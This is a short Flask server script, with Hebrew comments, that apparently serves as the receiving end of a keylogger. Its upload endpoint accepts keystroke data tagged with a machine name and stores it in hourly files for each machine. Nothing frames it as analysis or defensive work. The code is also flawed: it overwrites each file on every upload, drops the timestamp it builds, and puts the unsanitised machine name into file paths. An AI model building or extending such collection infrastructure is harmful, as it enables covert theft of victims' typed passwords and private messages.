from flask import Flask, request, jsonify
import os
from datetime import datetime

app = Flask(__name__)

DATA_DIR = "data"


# קובץ לפי שעה עגולה
def get_hourly_file_path(machine):
    now = datetime.now()
    hour_stamp = now.strftime("%Y%m%d_%H00")
    machine_dir = os.path.join(DATA_DIR ,machine)
    os.makedirs(machine_dir,exist_ok=True)
    return os.path.join(machine_dir, f"{hour_stamp}.txt")
# חותמת זמן לשורה
def file_writer(machine, encrypted_data):
    filepath = get_hourly_file_path(machine)
    timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
    line = f"{timestamp} {encrypted_data}\n"

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(encrypted_data)

@app.route('/api/upload', methods=['POST'])
def upload():
    content = request.json
    machine = content.get("machine_name")
    encrypted_data = content.get("keystrokes")

    if not machine or not encrypted_data:
        return jsonify({"error": "Missing data"}), 400

    file_writer(machine, encrypted_data)
    return jsonify({"status": "success"}), 200

if __name__ == '__main__':
    app.run(port=5000)

